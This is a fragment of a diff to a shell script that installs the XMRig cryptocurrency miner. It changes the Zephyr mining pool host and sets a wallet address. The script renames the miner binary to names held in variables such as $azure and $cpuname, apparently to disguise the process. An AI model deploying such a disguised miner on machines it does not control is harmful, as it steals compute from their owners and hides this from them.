@@ -16,7 +16,7 @@ rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=us-zephyr.miningocean.org:5432
+POOL=zeph-us-east1.nanopool.org:10900
 USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
 ALGO=rx/0
 DONATE=1
